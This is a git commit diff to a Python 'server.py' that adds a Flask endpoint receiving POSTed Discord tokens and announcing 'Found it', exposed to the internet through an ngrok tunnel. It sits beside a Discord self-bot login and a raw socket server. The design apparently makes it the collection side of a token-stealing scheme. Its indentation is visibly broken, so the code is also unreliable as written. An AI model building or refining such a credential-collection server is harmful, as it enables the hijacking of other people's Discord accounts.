357a6ec74289ff5c2854e68cdbe7a89010242db1
dontbanmeplz <59851616+dontbanmeplz@users.noreply.github.com>
2021-03-10 12:26:24 -0600

    Update server.py

--- Net/server.py
+++ Net/server.py
@@ -13,6 +13,18 @@ from discord.ext import commands
 from discord.ext.commands import Bot
 from plyer import notification
 
+from flask import Flask, request
+
+app = Flask(__name__)
+
+todos = {}
+tok = input("ngrok authtoken if you may: ")
+@app.route('/a', methods=['POST'])
+def main():
+    t = request.form['token']
+    notif("Found it", t)
+    return "", 200
+
 token = input(f"Put Your Token Here: ")
 os.system('cls')
 def notif(title, message):
@@ -32,14 +44,18 @@ class MyClient(discord.Client):
     encodedBytes = base64.b64encode(timestamp.encode("utf-8"))
     encodedstamp = str(encodedBytes, "utf-8")
     time.sleep(3)
-        while True:
-            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
-            s.bind((HOST, PORT))
-            s.listen()
-            conn, addr = s.accept()
-            with conn:
+    while True:
+        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+        s.bind((HOST, PORT))
+        s.listen()
+        conn, addr = s.accept()
+        with conn:
             print('Connected by', addr)
-            while True:
             conn.sendall(encodedid)
+            s.close()
+            continue
 client = MyClient()
 client.run(token, bot=False)
+app.run(port=5000)
+ngrok.set_auth_token(tok)
+ngrok_tunnel2 = ngrok.connect(5000)
